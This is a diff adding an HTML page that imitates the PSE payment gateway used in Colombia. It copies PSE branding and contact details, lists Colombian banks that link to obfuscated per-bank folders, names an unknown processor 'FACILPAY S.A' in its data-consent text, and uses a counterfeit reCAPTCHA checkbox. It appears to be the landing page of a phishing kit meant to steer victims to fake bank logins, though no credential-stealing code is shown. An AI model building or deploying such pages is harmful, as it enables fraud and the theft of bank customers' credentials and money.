@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>PSE - Pago con Registro Person Natural</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
+        <!-- jQuery desde CDN por si no existe local -->
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script type="text/javascript" src="js/functions.js"></script>  
+        <script type="text/javascript" src="js/ready.js"></script>
+        <link href="css/style.css" rel="stylesheet"> 
+    </head>
+    <body style="background-color: #fff">
+        <input type="hidden" name="hdd-opcion" id="hdd-opcion">
+
+        <div id="cabecera">
+            <img src="img/lps.png" id="logo-mobile">
+            <table cellpadding="0" cellspacing="0" width="98%" border="0" id="tbl-cabecera">
+                <tr>
+                    <td valign="middle" align="left" width="100" id="td-logo"><img src="img/lps.png" width="76"></td>
+                    <td valign="middle" align="left" id="td-texto">Fácil, rápido y seguro</td>
+                </tr>
+            </table>
+        </div>        
+
+        <img src="img/ayuda.jpg" id="ayuda">
+
+        <div style="text-align: center;font-weight: 700;font-size: 26px;color: #323153;margin-top: 47px;margin-bottom: 44px;padding: 0px 60px;">
+            Pasarela de pagos
+        </div>
+
+        <div id="formulario">            
+            <input type="hidden" name="hdd-persona" id="hdd-persona" value="Natural">
+            <input type="hidden" name="hdd-banco" id="hdd-banco" value="">
+
+            <!-- Tipo de cliente -->
+            <div class="inp" id="inp-persona">
+                <div class="etiqueta" id="etq-persona">Tipo de Cliente *</div>
+                <table border="0" cellspacing="0" cellpadding="0" width="100%" id="tbl-persona">
+                    <tr>
+                        <td valign="middle" align="left" id="td1-persona"><div class="entrada" id="txt-persona">Natural</div></td>
+                        <td valign="middle" align="right" id="td2-persona">&#9660;</td>
+                    </tr>
+                </table>
+            </div>
+            <div id="menu-tipo">
+                <div class="item-menu" id="mnu-natural">Natural</div>
+                <div class="item-menu" id="mnu-juridica">Jurídica</div>
+            </div>  
+
+            <!-- Selección de banco -->
+            <div class="inp" id="inp-banco">
+                <div class="etiqueta" id="etq-banco">Seleccione un banco *</div>
+                <table border="0" cellspacing="0" cellpadding="0" width="100%" id="tbl-banco">
+                    <tr>
+                        <td valign="middle" align="left" id="td1-banco"><div class="entrada" id="txt-banco">A continuación seleccione su banco</div></td>
+                        <td valign="middle" align="right" id="td2-banco">&#9660;</td>
+                    </tr>
+                </table>            
+            </div>
+            <div id="menu-banco">                        
+                <div class="item-menu" folder="">A continuación seleccione su banco</div>
+                <div class="item-menu" folder="b-34f1">BANCO AV VILLAS</div>
+                <div class="item-menu" folder="b-34f13">BANCO BBVA COLOMBIA S.A.</div>
+                <div class="item-menu" folder="b-34f2">BANCO CAJA SOCIAL</div>
+                <div class="item-menu" folder="b-34f3">BANCO DAVIVIENDA</div>
+                <div class="item-menu" folder="b-34f4">BANCO DE BOGOTA</div>
+                <div class="item-menu" folder="b-34f14">BANCO DE OCCIDENTE</div>
+                <div class="item-menu" folder="b-34f18">BANCO POPULAR</div>
+                <div class="item-menu" folder="b-34f9">BANCOLOMBIA</div>
+                <div class="item-menu" folder="b-34f12">SCOTIABANK COLPATRIA</div>
+                <div class="item-menu" folder="b-nequi">NEQUI</div>
+            </div>
+
+            <br>
+
+            <!-- Captcha simple reemplazando imágenes rotas -->
+            <div style="display:flex; align-items:center; gap:12px; border:1px solid #ddd; border-radius:4px; padding:14px 16px; max-width:300px; margin:10px 0; background:#f9f9f9;">
+                <input type="checkbox" id="catcha" onclick="catchaok()" style="width:22px;height:22px;cursor:pointer; accent-color:#323153;">
+                <label for="catcha" style="font-size:14px; color:#555; cursor:pointer; user-select:none;">No soy un robot</label>
+                <div style="margin-left:auto; text-align:center;">
+                    <div style="font-size:22px;">🔒</div>
+                    <div style="font-size:9px; color:#999;">reCAPTCHA</div>
+                </div>
+            </div>
+
+            <br>
+            <div class="texto">
+                Te direccionaremos a PSE para hacer uso de sus servicios
+                <br><br>
+                Autorizo de forma previa, expresa e informada a FACILPAY S.A para que realice el tratamiento de mis datos de acuerdo a las políticas aprobadas de la entidad
+            </div>
+            <br>
+            <button class="btn" id="btn-seguir" disabled>Sigue</button>            
+        </div> 
+
+        <br><br><br>
+
+        <div id="pie-mobile"><img src="img/super.jpg"></div>
+        <table cellpadding="0" cellspacing="0" border="0" width="80%" id="pie">
+            <tr>
+                <td align="left" id="lado-izq-pie"><img src="img/super.jpg"></td>
+                <td align="right" id="lado-der-pie">
+                    <div style="width:100%; max-width:340px;" class="letra-pie">Para mayor información comunícate con nosotros</div>
+                    <table cellpadding="0" cellspacing="0" border="0" width="100%" style="max-width: 340px;">
+                        <tr>
+                            <td></td>
+                            <td class="letra-pie">en Bogotá +57 (1) 3808890 opción 5</td>
+                        </tr>
+                        <tr>
+                            <td></td>
+                            <td class="letra-pie">o escríbenos https://www.pse.com.co/persona, opción centro de ayuda, Formulario de contacto.</td>
+                        </tr>
+                    </table>
+                </td>
+            </tr>
+        </table>
+
+    </body>    
+</html>
